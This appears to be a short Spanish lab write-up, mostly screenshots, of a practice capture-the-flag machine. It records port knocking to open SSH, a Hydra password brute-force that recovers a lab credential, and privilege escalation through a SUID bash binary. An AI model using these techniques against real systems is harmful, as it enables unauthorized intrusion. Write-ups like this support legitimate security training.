- --
- Tags: #ejptmachine  #portknocking 
---

![Pasted image 20250126181334](../../Fotos/Pasted%20image%2020250126181334.png)

![Pasted image 20250126181953](../../Fotos/Pasted%20image%2020250126181953.png)

![Pasted image 20250126182045](../../Fotos/Pasted%20image%2020250126182045.png)

![Pasted image 20250126182030](../../Fotos/Pasted%20image%2020250126182030.png)

`knock 172.17.0.2 7000 8000 9000`
![Pasted image 20250126184504](../../Fotos/Pasted%20image%2020250126184504.png)
- Tras el knocking tenemos acceso al puerto 22 ssh

`hydra -l toctoc -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64`
![Pasted image 20250126184952](../../Fotos/Pasted%20image%2020250126184952.png)
- toctoc : kittycat

![Pasted image 20250126185120](../../Fotos/Pasted%20image%2020250126185120.png)

![Pasted image 20250126185224](../../Fotos/Pasted%20image%2020250126185224.png)

Permisos SUID en ese archivo
![Pasted image 20250126185314](../../Fotos/Pasted%20image%2020250126185314.png)
![Pasted image 20250126185530](../../Fotos/Pasted%20image%2020250126185530.png)

`cat /home/toctoc/.bashrc`
![Pasted image 20250126185845](../../Fotos/Pasted%20image%2020250126185845.png)

`knock 172.17.0.2 5432 3629 9123`
![Pasted image 20250126190145](../../Fotos/Pasted%20image%2020250126190145.png)
- `sudo /opt/bash -p`
- `sudo -u root /opt/bash`



